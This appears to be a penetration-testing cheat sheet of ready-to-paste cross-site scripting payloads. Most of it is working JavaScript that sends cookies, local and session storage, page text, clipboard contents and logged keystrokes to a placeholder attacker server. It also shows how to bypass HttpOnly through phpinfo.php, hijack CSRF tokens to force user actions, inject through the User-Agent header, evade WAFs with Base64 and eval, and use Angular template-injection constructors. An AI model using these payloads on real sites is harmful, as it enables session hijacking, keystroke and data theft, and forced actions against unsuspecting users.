# Practical XSS Payloads
## ☕ ABOUT
Originally this started as just a little list of PoC payloads but it has now expanded to some more general notes as well. This now contains easy copy & paste PoC payloads as well as quick references for what HTML tags frequent event attributes use. 

### **Quick-navigation:**
+ **EXFILTRATION:**
  + [PHPINFO + HTTPONLY WOMBO COMBO](#bypassing-httponly)
  + [FETCH](#fetch)  
  + [.$GET](#jquery-ajax)
+ **FORCING ACTIONS:**
  + [CLICK](#-forcing-actions)
  + [DENYING ACTIONS](#prevent-a-user-from-accessing-a-webpage-highly-dependent-on-where-the-xss-occurs-great-for-scenarios-where-xss-is-stored-in-a-global-banner)
  + [FORCE ACTIONS WITH CSRF TOKEN](#FORCE-ACTIONS-WITH-CSRF-TOKEN)
+ **SETTING ITEMS:**
  + [DOCUMENT.COOKIE](#via-documentcookie)
  + [WINDOW.LOCALSTORAGE](#via-windowlocalstorage)
+ **EVENT ATTRIBUTES:**
  + [ONLOAD](#onload)
  + [ONERROR](#onerror)
  + [ONMOUSEOVER](#onmouseover)
  + [ONSELECT](#onselect)
  + [ONKEY/UP/DOWN/PRESS](#onkeyupdownpress)
+ **ANGULAR NOTE**
  + [PAYLOADS FOR ANGULAR](#angular)
+ **USER-AGENT BASED XSS**
  + [XMLHTTPREQUEST()](#-user-agent-based-xss)
+ **BYPASSING WAFS**
  + [BASE64 ENCODING](#-bypassing-wafs)

# 👁️‍🗨️ EXFILTRATION
*For session hijacking, sensitive info exfil, etc.*
## BYPASSING HTTPONLY
**NOTE**: *This is a fairly niche attack path, but demonstrates how cookie reflection isn't very secure.* If `phpinfo.php` is exposed it will read all the cookies from the request header **including cookies set to HttpOnly**. Because of this, if you make a GET request to `phpinfo.php` the response will contain all the cookies, you can then do whatver you want with it. In this case I just send the whole response out as a GET.
```javascript
fetch('/phpinfo.php').then(response => response.text()).then(data => fetch("$ATTACKER_SERVER/?response="+(encodeURIComponent(data))));
```
## FETCH
### GET VALUE FROM LOCAL STORAGE AND $FETCH:
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET VALUE FROM SESSION STORAGE AND $FETCH:
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET COOKIES AND $FETCH
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+document.cookie)
```
### GET COOKIES, POST $FETCH AND EXFIL RESPONSE (Good for exfiltrating data from response pages or where you might not be able to compromise cookies but leverage a CSRF token thats accessible)
```javascript
var data ={"YOUR_JSON":"SOMEVALUE"};var value=('; '+document.cookie).split(`; CSRF-TOKEN=`).pop().split(';')[0];fetch('/SENSITIVE_API_ENDPOINT',{method:'POST',headers: {'X-CSRF-Token':value,'Content-Type':'application/json;charset=utf-8',},body:JSON.stringify(data),}).then(response=>response.json()).then(data =>{fetch("https://{ATTACKER_SERVER}/key?"+JSON.stringify(data));});
```
### GET TEXT FROM PAGE AND $FETCH *(might be constrained by data length - use .slice() to shorten)*
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
```
### GET CONTENT FROM CLIPBOARD AND $FETCH *(Will prompt user for Clipboard perms if not already set)*
```javascript
setTimeout(async()=>fetch("https://$ATTACKER_SERVER/?copy="+(await window.navigator.clipboard.readText())), 1000)
```
### KEYLOGGER WITH $FETCH *(Script modified from Chentetrans logger)*
```javascript
var l = ""; document.onkeypress = function(e){;l+=e.key;fetch("https://$ATTACKER_SERVER/?q="+ l);}
```
## JQuery AJAX
### GET VALUE FROM LOCAL STORAGE AND $.GET
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET VALUE FROM SESSION STORAGE AND $.GET:
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET COOKIES AND $.GET
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
```  
### GET TEXT FROM PAGE AND $.GET *(might be constrained by data length - use .slice() to shorten)*
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
```


# 💥 FORCING ACTIONS
*For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
### FORCE ACTIONS WITH CSRF TOKEN
```javascript
fetch('/users/account')
    .then(function(response) {
        return response.text()
    })
    .then(function(html) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, "text/html");
        //capture CSRF token from page response
        var snag = doc.getElementsByName("CSRF_TOKEN")[0].value;
        //console.log(snag); //debug if you need it
        //console.log(doc); //debug if you need it
        InsertYourFunctionHere();

    })
    .catch(function(err) {
        console.log('Failed to fetch page: ', err);
    });
```
### CLICK ELEMENT BY ID
```javascript
document.getElementById("$TARGET_ELEMENT_ID").click()
```
### PREVENT A USER FROM ACCESSING A WEBPAGE (*highly dependent on where the XSS occurs. Great for scenarios where XSS is stored in a global banner*)
```javascript
if(window.location.pathname == "{THE_PAGE_YOU_WANT_TO_BLOCK}"){if(!window.location.search){window.location.replace("{THE_PAGE_TO_REPLACE}");}}
```



# 🏠 SETTING ITEMS
*Sometimes you may want to set items in the browsers storage for vulnerability chains or persistence.*

**NOTE:**
For persistence or certain vulnerability chains you'll want to make sure you set an appropriate path (i.e `/`). For the purpose of these examples I've included the root path.
### VIA document.cookie
```javascript
document.cookie="cookieName=cookieValue>;Path=/"
```
### VIA window.localStorage
```javascript
window.localStorage.setItem('itemName', 'itemValue');
```


# 📔 EVENT ATTRIBUTES
*Something super crucial about event attributes is that **not every HTML tag is going to support the same event attributes**. So when you have injection into a div and you're trying to use `onload()` it's not going to work.*

#### `ONLOAD`
```html
<body>
<frame>
<frameset>
<iframe>
<img>
<link>
<script>
<style>
<svg>
```
#### `ONERROR`
```html
<img>
<object>
<link>
<script>
```
#### `ONMOUSEOVER`
```HTML
ALL ELEMENTS EXCEPT:
<base>, <bdo>, <br>, <head>, <html>, <iframe>, <meta>, <param>, <script>, <style>, and <title>
```
#### `ONSELECT`
```html
<input>
<textarea>
```
#### `ONKEY/UP/DOWN/PRESS`
```html
ALL ELEMENTS EXCEPT:
<base>, <bdo>, <br>, <head>, <html>, <iframe>, <meta>, <param>, <script>, <style>, and <title>
```


# 🪦 USER-AGENT BASED XSS
**NOTE:** Most browsers (Chrome [*et al*] and FireFox) have read-only user-agent headers so while they can be *read* they cannot be modified without having something on-top of the Browser (i.e a Chrome extension or proxy). However, at the time of writing this **Safari on desktop and IOS** does not protect the user-agent header. Because of this, you can do some magic with XMLHttpRequest().

**PAYLOAD NOTE:** The below JavaScript assumes that the User-Agent is being returned in the response within a HTML attribute (i.e `agent="AAAAA"`) and uses `">` to end the element. document.write() is then used to return the body of the request.
```JavaScript
var xhr = new XMLHttpRequest();
xhr.open("GET", "YOUR_URL", true);
xhr.setRequestHeader('User-Agent','AAAAAAAA"><script>alert(1)</script>');
xhr.onreadystatechange = function() {
    document.write(xhr.response)
}
```


# 🥷 BYPASSING WAFS
**NOTE:** If you're running into a WAF that is looking for characters like `<`,`>`, or `/` but you can create simple payloads (*for example an event attribute `onmouseover=alert(1)`*) you may be able to circumvent the WAF by using Base64 encoding.
```JavaScript
// Encode your payload
btoa('YourPayload()');
// Decode your payload and pass to eval()
eval(atob('YWxlcnQoMSk='));
```


# ANGULAR
For Angular template injection you should be able to use the above payloads in conjunction with constructors. You can find an example below.
### GET VALUE FROM SESSION STORAGE AND FETCH
```javascript
{{constructor.constructor('fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))')()}}
```
